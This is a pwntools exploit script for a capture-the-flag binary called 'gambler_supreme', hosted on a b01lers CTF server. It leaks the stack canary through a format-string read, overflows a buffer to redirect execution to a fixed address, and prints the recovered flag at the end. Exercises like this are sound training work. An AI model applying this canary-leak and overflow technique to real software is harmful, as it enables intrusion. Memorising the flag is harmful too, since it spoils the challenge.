#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host ctf.b01lers.com --port 9201 ./gambler_supreme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./gambler_supreme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'ctf.b01lers.com'
port = int(args.PORT or 9201)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *casino+313
b *casino+520
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

fsb = b'%13$p'
io.sendline(b'7')

io.sendline(fsb)
io.recvuntil('Your guess:')
canary = int(io.recvline().rstrip(), 0)
print(f"[+] Canary: {hex(canary)}")

payload = b'A'*40
payload += p64(canary)
payload += b'B'*8
payload += p64(0x4015ba)
io.sendline(payload)
io.interactive()
# bctf{1_w4nn4_b3_th3_pr0_g4mb13r}
